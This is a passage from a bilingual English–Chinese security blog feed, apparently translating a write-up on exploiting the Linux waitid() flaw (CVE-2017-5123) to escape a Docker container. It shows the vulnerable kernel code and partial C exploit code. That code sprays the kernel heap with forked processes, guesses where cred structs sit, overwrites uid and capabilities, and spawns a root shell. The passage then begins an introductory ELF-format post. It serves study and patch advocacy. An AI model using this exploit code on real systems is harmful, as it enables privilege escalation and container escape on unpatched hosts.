  &lt;p&gt;Linux capabilities 被儲存在每個行程自己的 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 並使用 bitmask 來表示。例如所有的 caps 都被啟用的話，則用 bitmask 表示成 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF
&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Each capability provides a different set of permissions, for instance:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;每個 capability 提供一個不同的權限分配，舉例來說:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;CAP_SYS_MODULE&lt;/strong&gt; - allows for loading &amp;amp; unloading kernel modules.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CAP_NET_ADMIN&lt;/strong&gt; - allows for various network operations. For example entering promiscuous mode, interface configuration and more.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CAP_SYS_ADMIN&lt;/strong&gt; - enables a range of system administration operations such as quotactl, mount, umount, swapon, setdomainname, ptrace and much more(this cap gives the most privileges and overloads others).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;CAP_SYS_MODULE&lt;/strong&gt; - 允許載入或卸載核心模組。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;CAP_NET_ADMIN&lt;/strong&gt; - 允許數種網路操作，例如開啟混沌模式，介面設定等等。&lt;/p&gt;

  &lt;p&gt;&lt;strong&gt;CAP_SYS_ADMIN&lt;/strong&gt; - 啟用一個範圍內的系統管理操作，如 quotactl, mount, umount, swapon, setdomainname, ptrace 等等(這個 cap 給了最多權限並會多載其他的 cap)。
(編按:這個權限在 Linux manual 中建議最好避免使用，畢竟會賦予非常多的權限，幾乎可以說是一個另類的 root，除非須需求幾乎等同於此 cap，否則建議能避則避。)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;You can find the full list of CAPS over here.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;你可以在&lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;這裡&lt;/a&gt;找到完整的 CAPS 清單。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Docker uses capabilites to provide a better isolation for containers. It simply drops capabilities that would enable container escape. For example, you will rarely see a container that is running out-of-the-box with any of the 3 capabilities above, as it would be security concern if a container could access the network interface and sniff the traffic of other containers or the host itself, or if a user inside the container could mount directories on the host and load kenrel modules.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Docker 使用 capabilities 來為容器提供一個較好的隔離環境。Docker 純粹的將可能造成脫離容器的 capabilities 拿掉。例如，你會幾乎看不到一個容器運行在限制之外，有著上述三個 capabilities 的任何一個，當一個容器可以存取網路介面並嗅探其他容器或是主機的流量，或是一個在容器中的使用者可以在主機上掛上目錄並且載入核心模組，這些都是有安全疑慮的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Although it might be easier to build a ROP chain and call commit_creds(0) in order to gain root with full capabilities, in order to learn more about heap spraying, I decided to go with the blind exploitation method by spraying the kernel heap with thousands of struct creds like Federico did. The downside of the this exploit is that full caps are impossible to reach as we are not in control of what we are writing(we are limited to 0x8000) and the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt; is out of reach for us.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;雖然造一個 &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;ROP&lt;/a&gt;鏈來呼叫 commit_creds(0) 以獲得 root 權限與全部的 capabilities 似乎來的更簡單一點，但為了學到更多與堆積噴灑相關的技巧，並且在不知道目標環境下的漏洞利用方法，就像 Federico 做的一樣，將數千個 creds 結構噴好噴滿到核心堆積中。這個漏洞利用的缺點就是無法取得全部的 caps，因為我們無法控制寫入的東西(我們受限於 0x8000 的限制) 而且 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt; 對我們來說是不可能達到的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;the-vulnerability--弱點成因&quot;&gt;The vulnerability / 弱點成因&lt;/h2&gt;

&lt;p&gt;The code snippet below is taken from &lt;em&gt;kernel/exit.c&lt;/em&gt; and is in charnge of handling the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這是從 &lt;em&gt;kernel/exit.c&lt;/em&gt; 取得的程式碼片段，負責處理系統
呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt;:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;SYSCALL_DEFINE5(waitid, int, which , pid_t, upid, struct siginfo __user *, infop, int, options, struct rusage __user *, ru)
{
    struct rusage r;
    struct waitid_info info = {.status = 0};
    
    long err = kernel_waitid(which, upid, &amp;amp;info, options, ru ? &amp;amp;r : NULL);
    
    int signo = 0;
    
    if (err &amp;gt; 0) {
        signo = SIGCHLD;
        err = 0;
        if (ru &amp;amp;&amp;amp; copy_to_user(ru, &amp;amp;r, sizeof(sturct rusage)))
        return -EFAULT;
    }
    if (!infop)
        return err;
    
    if (!/*醒目*/access_ok/*提示*/(VERIFY_WRITE, infop, sizeof(*infop)))
        return -EFAULT; 
    user_access_begin();
    unsafe_put_user(signo, &amp;amp;infop-&amp;gt;si_signo, Efault);
    unsafe_put_user(0, &amp;amp;infop-&amp;gt;si_errno, Efault);
    unsafe_put_user(info.cause, &amp;amp;infop-&amp;gt;si_code, Efault);
    unsafe_put_user(info.pid, &amp;amp;infop-&amp;gt;si_pid, Efault);
    unsafe_put_user(info.uid, &amp;amp;infop-&amp;gt;si_uid, Efault);
    unsafe_put_user(info.status, &amp;amp;infop-si_status, Efault);
    user_access_end();
    return err;
Efault:
    user_access_end();
    return -EFAULT;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The vulnerability is that the highlighted &lt;code class=&quot;highlighter-rouge&quot;&gt;access_ok()&lt;/code&gt; check, which ensures that the user specified pointer is in face a user-space pointer, was missing in the &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall. Without this check a user can supply a kernel address pointer and the syscall will write to it without objections when executing &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;弱點在於有醒目提示的 &lt;code class=&quot;highlighter-rouge&quot;&gt;access_ok()&lt;/code&gt; 檢查，用來保證使用者指定的指標是屬於使用者空間的指標，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 系統呼叫中少了這個檢查，缺了這個檢查，使用者可以提供一個核心地址指標，當執行 &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user&lt;/code&gt; 時系統呼叫會毫無異議的寫入該位址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As we already know - we can’t simply write whatever we want, but we will have to try to gain as much as we can within these limitations.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;如同我們已經知道的 - 我們不能任意的想寫入哪裡就寫入哪裡，但我們必須在這些限制之下，竭盡我們所能的嘗試獲取可寫位址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Info.status&lt;/code&gt; is a 32bit int, but the value of status is constrained to 0 &amp;lt; status &amp;lt; 256 as we can ses in the exit codes documentation, and as we already know&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;is constrained by&lt;code class=&quot;highlighter-rouge&quot;&gt;MAX_PID&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Info.status&lt;/code&gt;是一個 32bit 整數，但狀態的值被約束在 0 與 256 之間，就像我們在 exit 程式碼文件看到的，同時我們也知道&lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt;被&lt;code class=&quot;highlighter-rouge&quot;&gt;MAX_PID&lt;/code&gt;約束了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;At this point we have the ability to write a value of pid: 0 &amp;lt; pid &amp;lt; 0x8000 to anywhere we want. The next challenge is to detect where we should write in order to successfully overwirte the desired values.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;目前我們有寫入 pid 值得能力: 介於 0 到 0x8000，到任意我們想要的地方，下一個挑戰是偵測到我們該寫到的位置，才能成功的覆寫想要的值。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We need to rememer that the syscall will actually write 6 different fields each time we execute it, as there will be 6 executions of &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user()&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們需要記得，系統呼叫在每次執行的時候，實際上會寫入 6 個不同欄位，因為有 6 個 &lt;code class=&quot;highlighter-rouge&quot;&gt;unsafe_put_user()&lt;/code&gt; 被執行了。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So we will need to take into account the offset of &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; sturct and use it to subtract that value from the target address into &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; syscall as the &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; pointer.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以我們需要帶入 &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; 結構中 &lt;code class=&quot;highlighter-rouge&quot;&gt;pid&lt;/code&gt; 的帳戶偏移值，並使用它減去到 &lt;code class=&quot;highlighter-rouge&quot;&gt;waitid()&lt;/code&gt; 呼叫的目標位址的值作為 &lt;code class=&quot;highlighter-rouge&quot;&gt;infop&lt;/code&gt; 指標。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Our main goal with this exploit is to overwrite the capabilities that Docker sets for us, thus gaining additional privileges and to escape the container.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們使用這個漏洞利用的主要目標是，覆寫 Docker 為我們設定的 capabilities，就可以獲得額外的權限並且逃離容器。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;spray-n-pray--噴灑並禱告&quot;&gt;Spray n’ Pray / 噴灑並禱告&lt;/h2&gt;

&lt;p&gt;I decided to take an approach similar to Federico, so I proceeded to spray the kernel heap with thousands of struct &lt;code class=&quot;highlighter-rouge&quot;&gt;creds&lt;/code&gt; and then start guessing by writing to various addresses and pray to hit my target.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我決定使用與 Federico 相似的方法，所以我用數千個 &lt;code class=&quot;highlighter-rouge&quot;&gt;creds&lt;/code&gt; 結構將核心堆積噴好噴滿，然後開始透過寫入不同位址來猜測，禱告並祈求可以擊中我的目標。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;By picking a value that we can track such as &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; (which we can track with getuid()).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;藉著選一個我們可以追蹤的值如 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; (我們可以使用 getuid() 來追蹤)。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We can, with a little bit a luck, pinpoint our &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; location, after which we will be able to write to specific offsets in order to overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;capabilities&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; and anything else we want.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;幸運的話，我們可以做到的，指向我們的 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; 位置，之後我們將能寫到指定的偏移，就可以覆寫 &lt;code class=&quot;highlighter-rouge&quot;&gt;capabilities&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; 與其他任何我們想要的東西。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;But in order to do that we need to figure out the actual offsets, which we will do with the help of &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;但為了要實現，我們需要搞清楚真實的偏移值，我們將依靠 &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; 的幫助來實現:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, &lt;code class=&quot;highlighter-rouge&quot;&gt;kuid_t&lt;/code&gt; is 4 bytes in size, as such if we found uid on &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1004&lt;/code&gt; than &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; will be at &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1008&lt;/code&gt;, 4 bytes above, and &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; will be at &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023CC1014&lt;/code&gt; which is 4*0x4=0x10 bytes above our &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; address as illustrated in the diagram below.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;猶如我們看到的， &lt;code class=&quot;highlighter-rouge&quot;&gt;kuid_t&lt;/code&gt; 是 4 個位元組的大小，因為醬子，如果我們在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1004&lt;/code&gt; 發現 uid ，那麼 &lt;code class=&quot;highlighter-rouge&quot;&gt;gid&lt;/code&gt; 會在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023cc1008&lt;/code&gt;， 4 個位元組之上，而 &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; 會在 &lt;code class=&quot;highlighter-rouge&quot;&gt;0xFFFF880023CC1014&lt;/code&gt;，就是 4*0x4=0x10(編按: 0x開頭是16進位，並非0乘4) 位元組之上，我們的 &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; 位址，如下圖所示。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So essentially in order to overwite our caps will have to write to:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以重要的是為了覆寫我們的 caps 將必須寫到:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;address_of_uid+0x4*8 = address_of_uid+0x20 = address_of_cap_inferitable&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Note: These addresses are relevant to my system, your addresses might differ.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;註: 這些位址跟我的系統有相關聯，你的位址可能會不一樣。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In order to find out where our sprayed &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; might land in the heap we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; again and set a breakpoint on &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_getuid&lt;/code&gt; in order to break when our program calls &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;為了找到我們噴灑的 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; 在堆積中可能的落點，我們將再次使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; 並設置一個中斷點在 &lt;code class=&quot;highlighter-rouge&quot;&gt;sys_getuid&lt;/code&gt; 上，以便在程式呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt; 的時候中斷下來。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;A few step commands after the breakpoint (it took 5 on my system) should reveal the &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; address in the RAX register.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;斷下來後，步進幾個指令(在我的系統上是 5 個)應該會在 RAX 暫存器中顯示 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 的位址。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We can repeat that process of finding the struct for a number of forks in order to collect enough addresses and analyze the statistics of where the &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; is most likely to be in the heap&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們可以重複這個找結構的過程，藉由數個分叉(fork)以便收集足夠的位址並分析統計 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; 在堆積中最有可能的所在。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So the plan is as follows:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;計畫如下:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;Spawn thousands of processes by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; in order to create thousands of &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; in the kernel heap and make each of the processes constantly check if its UID==0 by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Start writing the value 0 to addresses to which the &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred-&amp;gt;uid&lt;/code&gt; might land&lt;/li&gt;
  &lt;li&gt;If and when one of our forked processes gets uid==0, it means that we have successfully overwritten the &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; value with our guesses from step 2. Now we can overwrite the rest of the &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; and change caps by writing to the offsets that we determined.&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;為了在核心堆積中創造數千個 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; 需要透過呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; 產生數千個行程，並且呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt; 使每個行程都不斷地檢查它自己的 UID 是否為 0&lt;/li&gt;
    &lt;li&gt;開始將 0 寫入位 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred-&amp;gt;uid&lt;/code&gt; 可能的落點位址中&lt;/li&gt;
    &lt;li&gt;當其中一個我們分叉(fork)出來的行程獲得 uid 為 0，就代表我們已經成功從第二步猜測到並覆寫了&lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt;的值。現在我們可以覆寫 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 其餘的部分並藉由覆寫我們計算的值來修改 caps。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;p&gt;Our dirty exploit will be something to the effect of:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們的髒髒漏洞利用效果如下:&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;void writecaps(char *addr,unsigned long value){
while(1) {
      int pid = clone(exit_func, &amp;amp;amp;new_stack[5000], CLONE_VM | SIGCHLD, NULL);
      if (!pid) {
        exit(0);
      }
      if (pid == value) {
        syscall(SYS_waitid, P_PID, pid, addr, WEXITED, NULL);
        break;
      }
}

void spraynpray(){
pid_t pid;
FILE *f;
char *argv[] = {&quot;/bin/sh&quot;, NULL};
for (int i=0;i&amp;lt;5000;i++)
{
    pid = fork();
    if (pid==0)
    { // child process
  while (1) {
    
    if (*glob_var==1) {
      syscall(SYS_exit, 0);
    }
    if (getuid() == 0){
        //FOUND!!
    printf(&quot;[+] Got UID: 0 !\n&quot;);
     *glob_var = 1;
     writecaps((char *)finalcapsaddress,value);
    printf(&quot;Done, spawning a shell \n&quot;);
    execve(&quot;/bin/sh&quot;, argv, NULL);
    }
}
    }

    else if(pid&amp;lt;0)
    {
        printf(&quot;failed to fork&quot;);
    }

    else // parent process
    {

    }
}
}

void swapuid(){

    char* i,p;
    while(*glob_var!=1)
    {
    for(i = (char *)0xffff8800321b4004; ; i+=0xc0)
        {
        if(*glob_var==1)
            {
            break;
            }
        printf(&quot;trying %p\n&quot;,i);
        syscall(__NR_waitid, P_PID, 0,(siginfo_t *)i, WEXITED, NULL);
        sleep(1);
        }
    }
munmap(glob_var, sizeof *glob_var);
printf(&quot;Found uid on %p\n&quot;,i-0xc0);
sleep(10000);
}

int main(void)
{
    glob_var = mmap(NULL, sizeof *glob_var, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    *glob_var = 0;

unsigned long* base = findbase();
    findheapbase();
    spraynpray();
    swapuid();
}
    
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After analyzing my system (Ubuntu 17.10,Kernel 4.13.0-15, arch x86-64), I found a couple of areas where it seemed that cred struct is more likely to land in about 70% of the executions, but there is still a risk of crashing the machine because we may overwrite something important in the kernel.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在分析我的系統資後 (Ubuntu 17.10, 核心 4.13.0-15, 架構 x86-64)，我發現數個區域貌似是運行時 creds 結構有 70% 以上的落點，但那仍然有使機器掛掉的風險存在，因為我們可能會覆寫到核心中重要的東西。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;conclusion--結論&quot;&gt;Conclusion / 結論&lt;/h2&gt;

&lt;p&gt;In 2017 alone, 434 linux kernel exploits where found, and as you have seen in this post, kernel exploits can be devastating for containerized environments. This is because containers share the same kernel as the host, thus trusting the built-in protection mechanisms alone isn’t sufficient. Make sure your kernel is always updated on all of your production hosts.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;光是 2017 年就已經有 &lt;a href=&quot;https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33&quot;&gt;434 個 Linux 核心漏洞利用&lt;/a&gt;被發現，如同你在這篇文章中看到的一樣，核心漏洞利用對容器環境來說是具毀滅性的。這是因為容器與主機分享核心，因此光是信任內建的保護機制並不足夠。確保你的核心在所有的產品主機都總是最新的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Thank you for reading and don’t forget to follow us @TwistlockLabs.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;謝謝你的閱讀，別忘了在 &lt;a href=&quot;https://twitter.com/TwistlockLabs&quot;&gt;@TwistlockLabs&lt;/a&gt; 跟隨我們。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Big credits to Federico Bento for pointing some things out and to &lt;a href=&quot;https://salls.github.io/Linux-Kernel-CVE-2017-5123/&quot;&gt;Chris Salls&lt;/a&gt; for his Chrome sandbox escape exploit; my exploitation is heavily based on their work.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;給點清了某些事情的&lt;a href=&quot;https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/&quot;&gt;Federico Bento&lt;/a&gt;一個大大的讚， &lt;a href=&quot;https://salls.github.io/Linux-Kernel-CVE-2017-5123/&quot;&gt;Chris Salls&lt;/a&gt;也是，感謝他的 Chrome 沙盒逃脫漏洞利用; 我的漏洞利用大多數是基於他們的成果。&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="Docker" /><category term="CVE" /><category term="Linux" /><summary type="html">The post describes how I exploited the waitid() vulnerability in order to modify the Linux capabilities of a Docker container to gain elevated privileges, and ultimately escape the container jail. If you wnat to see how Twistlock would stop this vulnerability in its tracks, check out my follow up blog.</summary></entry><entry><title type="html">Linux ELF 二進位檔案入門：搞懂兼分析</title><link href="https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis.html" rel="alternate" type="text/html" title="Linux ELF 二進位檔案入門：搞懂兼分析" /><published>2018-03-08T00:00:00+08:00</published><updated>2018-03-08T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis.html">&lt;h1 id=&quot;the-101-of-elf-binaries-on-linux-understanding-and-analysis&quot;&gt;The 101 of ELF Binaries on Linux: Understanding and Analysis&lt;/h1&gt;

&lt;h2 id=&quot;executable-and-linkable-format-可執行檔與可連結格式&quot;&gt;Executable and Linkable Format 可執行檔與可連結格式&lt;/h2&gt;

&lt;p&gt;An extensive dive into ELF files: for security incident response, development, and better understanding&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;廣泛的深入 ELF 檔案: 為了資安事件響應、程式開發與更好的理解&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We often don’t realize the craftsmanship of others, as we conceive them as normal. One of these things is the usage of common tools, like &lt;em&gt;ps&lt;/em&gt; and &lt;em&gt;ls&lt;/em&gt;.Even though the commands might be perceived as simple, under the hood there is more to it: ELF binaries. Let’s have an introduction into the world of this common file format for Linux and UNIX-based systems.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;我們通常不理解其他的技術，把他們想的跟喝水一樣普通。其一便是一般工具的使用方法，像是 &lt;em&gt;ps&lt;/em&gt; 與 &lt;em&gt;ls&lt;/em&gt;。甚至該指令可能是被認為簡單的，其實還有更多隱藏在 ELF 二進位格式中。讓我們向世界介紹這個在 Linux 與 基於 UNIX 系統上普遍可見的檔案格式。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Why learn the details of ELF ? 為什麼要了解 ELF 的細節?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Before diving into more technical details, it might be good to explain why understanding of the ELF format is useful. As a starter, it helps to learn the inner workings of our operating system. When somehing goes wrong, we might better understand what happened (or why). Then there is the value in being able to research ELF files, e.g. after a security breach (incident response, malware research, forencis). Last but not least, for a better understanding while developing. Even if you program in a high-level language like Golang, you still might benefit from knowing what happens behind the scenes.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;在更深入到技術細節之前，最好先解釋一下為什麼了解 ELF 格式是有用的，當作開頭，可以幫助學習我們作業系統裡面的運作原理。當某些東西出錯了，我們或許較能知道發生了什麼事情(或是為什麼)。這就是研究 ELF 檔案的價值所在，例如在一波資安攻擊之後(事件響應，惡意軟體研究，鑑識)。最後而同樣重要的是，能在開發時有更好的理解力。甚至當你在使用高級語言如 Golang，你仍可能受益於知曉該場景背後發生了些什麼事情。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;From source to process 從原始碼到行程&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So whatever operating system we run, it needs to translate common functions to the language of the CPU, also known as machine code. A function could be something basic like opening a file on disk or showing something on the screen. Instead of talking directly to the CPU, we use a programming language, using internal functions. A compiler then translates these functions into object code. This object code is then linked into a full program, by using a linked tool. The result is a binary file, which then can be executed on that specific platform and CPU type.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;所以無論我們運行任何作業系統，它需要將一般功能翻譯成 CPU 的語言，也被稱為機器語言。一個函式可被拆分成基本的指令像是在硬碟上開啟一個檔案或是顯示一些東西在螢幕上。儘管可以直接對 CPU 下達指令，我們使用一種程式語言，使用內部的函式。然後使用編譯器翻譯這些函式成為目的碼(編按: object code)。藉由使用連結工具這個物件碼將被連結成一個完整的程式。結果是一個可以執行在特定平台與 CPU 架構下的二進制檔案。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;Before you start 在開始之前&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This blog post will share a lot of commands. Don’t run them on production systems. Better do it on a test machine. If you like to test commands, copy an existing binary and use that. Additionally, we have provided a small C program, which can you compile. After all, trying out is the best way to learn and compare results.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;這個部落格文章將分享一堆指令。請勿在正式環境執行。最好是在測試環境上。如果你喜歡測試指令，複製一個已存在的二進制檔並使用他們。此外，我們提共了一個小型的 C 語言程式，你可以自行嘗試編譯。總之，嘗試是最好的學習方式與比對結果。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;not-just-executables-並非只是可執行檔&quot;&gt;Not Just Executables 並非只是可執行檔&lt;/h2&gt;

&lt;p&gt;A common misconception is that ELF files are just for executables. We already have seen they can be used for partial pieces (object code). Another example includes shared libraries, and even core dumps (those core or a.out files). ELF is also used for the kernel and kernel moduels on Linux machines.&lt;/p&gt;

&lt;blockquote&gt;
